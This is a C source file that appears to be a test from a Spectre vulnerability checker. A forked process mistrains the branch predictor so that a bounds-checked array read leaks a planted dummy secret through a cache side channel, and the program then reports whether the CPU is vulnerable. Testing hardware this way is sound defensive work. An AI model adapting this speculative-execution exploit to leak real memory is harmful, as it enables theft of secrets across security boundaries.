#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRETSS"

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if ((float)x / (float)len < 1)
    {
        // countermeasure: add the fence here
        cache_encode(data[x]);
    }
}

int main(int argc, const char **argv)
{
    PREPARE();
    printf("Spectre_PHT_ca_ip Begins...\n");

    pid_t pid = fork();
    // initialize memory
    memset(mem, pid, pagesize * 256);

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain with valid index
        if (pid == 0)
        {
            for (int y = 0; y < 10; y++)
            {
                access_array(0);
            }
        }
        else
        {
            // potential out-of-bounds access
            access_array(j);

            mfence(); // avoid speculation
            cache_decode_array(leaked, j);
        }
    }
    if (pid != 0)
    {
        for (int i = 0; i < sizeof(SECRET) - 1; i++)
        {
            if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
            {
                passed_count++;
            }
        }
        if (passed_count > 0)
        {
            printf(ANSI_COLOR_RED "Spectre_PHT_ca_ip: Vulnerable\n" ANSI_COLOR_RESET);
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_PHT_ca_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
        }
        printf("Spectre_PHT_ca_ip Done!\n\n");
    }
    else
    {
        exit(0);
    }
}